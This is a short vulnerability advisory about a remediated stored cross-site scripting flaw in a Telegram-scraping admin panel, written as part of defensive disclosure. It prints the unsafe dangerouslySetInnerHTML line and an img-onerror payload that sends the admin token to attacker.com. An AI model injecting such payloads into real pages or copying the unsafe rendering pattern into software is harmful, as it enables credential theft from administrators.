# VULN-005: Stored Cross-Site Scripting (XSS) via Telegram Preview Renderer

**Severity**: HIGH  
**Status**: REMEDIATED  
**CWE**: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')  
**Component**: `tg-setup/src/components/EditModal.tsx`, `tg-setup/src/app/App.tsx`  

## Description
Scraped Telegram deals and channel posts containing HTML tags or script injection payloads were rendered directly via `dangerouslySetInnerHTML` in the admin curation preview and edit modals without HTML entity escaping or sanitization. If a scraped channel broadcast an image tag with an onerror handler or malicious script payload, it could execute in the admin's browser context.

## Proof of Concept / Verification
Before fix:
```tsx
// Unsanitized string rendered directly to DOM
<span key={i} dangerouslySetInnerHTML={{ __html: part }} />
```
Payload: `<img src=x onerror=fetch('https://attacker.com/steal?token='+localStorage.getItem('dealflow_admin_token'))>`

## Remediation
Created `renderSafeTelegramText` parser in `tg-setup/src/utils/telegramText.tsx` which parses bold (`**`) and strikethrough (`~~`) into React `<strong>` and `<del>` virtual DOM nodes. React treats raw string contents as text primitives and automatically escapes all HTML entities, completely removing `dangerouslySetInnerHTML`.
